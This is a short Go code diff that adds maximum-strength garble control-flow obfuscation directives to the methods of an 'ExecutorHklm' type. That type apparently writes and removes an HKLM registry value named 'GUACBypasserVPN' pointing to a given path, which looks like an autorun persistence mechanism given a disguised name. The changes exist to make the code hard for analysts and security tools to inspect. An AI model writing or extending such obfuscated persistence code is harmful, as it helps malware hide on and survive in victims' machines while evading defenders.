@@ -11,7 +11,7 @@ import (
 )
 
 type ExecutorHklm struct{}
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorHklm) findKey() (string, error) {
 	var key string
 	if strconv.IntSize == 32 {
@@ -23,7 +23,7 @@ func (e ExecutorHklm) findKey() (string, error) {
 	}
 	return key, nil
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorHklm) Exec(path string) error {
 	kpath, err := e.findKey()
 	if err != nil {
@@ -37,7 +37,7 @@ func (e ExecutorHklm) Exec(path string) error {
 	err = k.SetStringValue("GUACBypasserVPN", path)
 	return err
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorHklm) Revert() error {
 	kpath, err := e.findKey()
 	if err != nil {
